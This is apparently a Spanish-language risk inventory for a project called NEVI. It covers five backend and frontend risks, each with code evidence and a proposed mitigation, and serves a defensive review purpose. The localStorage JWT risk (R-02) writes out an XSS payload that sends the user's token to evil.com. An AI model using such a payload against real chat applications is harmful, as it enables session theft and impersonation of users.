# 03 — Inventario de riesgos · NEVI

> Todos los riesgos están respaldados por evidencia empírica extraída
> directamente del código fuente del repositorio. No se incluyen riesgos
> genéricos sin sustento.

## R-01 · Pool de conexiones HikariCP agotado

| Campo | Detalle |
|---|---|
| **Probabilidad** | Media |
| **Impacto** | Alto |
| **Nivel** | 🔴 Crítico |

**Descripción:** HikariCP tiene un máximo de **10 conexiones** por defecto.
Cada petición autenticada realiza al menos una consulta para validar el
JWT y otra para la operación de negocio. Bajo carga concurrente (> 5
usuarios activos en chat simultáneo), el pool puede agotarse y generar
errores `HikariPool-1 - Connection is not available, request timed out`.

**Evidencia en el código:**

```yaml
# backend/src/main/resources/application.yml
spring:
  datasource:
    hikari:
      maximum-pool-size: 10
```

**Condición de fallo:** 10+ usuarios envían mensajes de chat
simultáneamente; el WebSocket mantiene conexiones STOMP abiertas mientras
las consultas a PostgreSQL esperan turno en el pool.

**Mitigación propuesta:** Aumentar `maximum-pool-size` a 20–30; ajustar
`connection-timeout` a 3000 ms para fallar rápido.

---

## R-02 · JWT almacenado en localStorage — superficie XSS

| Campo | Detalle |
|---|---|
| **Probabilidad** | Media |
| **Impacto** | Muy alto |
| **Nivel** | 🔴 Crítico |

**Descripción:** El token JWT se guarda en `localStorage` del navegador
bajo la clave `nevi_token`. Cualquier script JavaScript que se ejecute
en la página (por ejemplo, a través de XSS en el contenido de un chat)
puede leer ese token y suplantar la identidad del usuario sin conocer
su contraseña.

**Evidencia en el código:**

```javascript
// frontend — almacenamiento del token tras login
localStorage.setItem('nevi_token', response.data.token);
```

**Condición de fallo:** Un atacante inyecta `<script>fetch('https://evil.com?t='+localStorage.getItem('nevi_token'))</script>`
en un mensaje de chat; el navegador de la víctima ejecuta el script y
envía el token al atacante.

**Mitigación propuesta:** Migrar el token a una cookie `HttpOnly; Secure;
SameSite=Strict`, inaccesible desde JavaScript.

---

## R-03 · `ddl-auto: update` — riesgo de corrupción de esquema

| Campo | Detalle |
|---|---|
| **Probabilidad** | Media |
| **Impacto** | Alto |
| **Nivel** | 🔴 Crítico |

**Descripción:** La propiedad `spring.jpa.hibernate.ddl-auto: update`
hace que Hibernate modifique el esquema de PostgreSQL automáticamente al
arrancar. En producción, un cambio de entidad mal planificado puede
alterar o eliminar columnas con datos reales sin posibilidad de rollback.

**Evidencia en el código:**

```yaml
# backend/src/main/resources/application.yml
spring:
  jpa:
    hibernate:
      ddl-auto: update
```

**Condición de fallo:** El equipo renombra un campo en una entidad JPA;
al desplegar, Hibernate crea la columna nueva y abandona la antigua con
sus datos históricos.

**Mitigación propuesta:** Cambiar a `ddl-auto: validate` en producción y
gestionar migraciones con Flyway o Liquibase.

---

## R-04 · Sin pruebas de integración en el backend

| Campo | Detalle |
|---|---|
| **Probabilidad** | Alta |
| **Impacto** | Alto |
| **Nivel** | 🔴 Crítico — bloquea Checkpoint Hito 5 |

**Descripción:** El backend no tiene ninguna prueba `@SpringBootTest` ni
de integración para los endpoints de autenticación, chat o cursos.
Cualquier refactorización puede romper el flujo sin detección en CI.

**Evidencia en el código:**

```bash
find backend/src/test -name "*.java" | wc -l
# → 0  (cero archivos de prueba en el backend)
```

**Condición de fallo:** El equipo modifica `AuthController`; el CI no
detecta la regresión; los usuarios no pueden iniciar sesión en producción.

**Mitigación propuesta:** Crear al menos una prueba `@SpringBootTest` con
`MockMvc` que cubra: registro → login → acceso a recurso protegido.
Configurar H2 en perfil `test` para aislar el entorno.

---

## R-05 · CORS con `allowed-origins: "*"`

| Campo | Detalle |
|---|---|
| **Probabilidad** | Media |
| **Impacto** | Medio |
| **Nivel** | 🟡 Moderado |

**Descripción:** La API acepta peticiones de cualquier origen. En un
entorno de producción, esto permite que cualquier sitio web externo haga
peticiones autenticadas a la API usando las credenciales del usuario
(cookies o tokens). Combinado con R-02 (JWT en localStorage), amplía
la superficie de ataque.

**Evidencia en el código:**

```yaml
# backend/src/main/resources/application.yml
web:
  cors:
    allowed-origins: "*"
```

**Condición de fallo:** Un sitio malicioso hace una petición a
`/api/chat/messages` usando el JWT robado de localStorage; la API
responde correctamente porque el origen está permitido.

**Mitigación propuesta:** Restringir `allowed-origins` al dominio
específico del frontend (`http://localhost` en desarrollo,
`https://nevi.app` en producción).
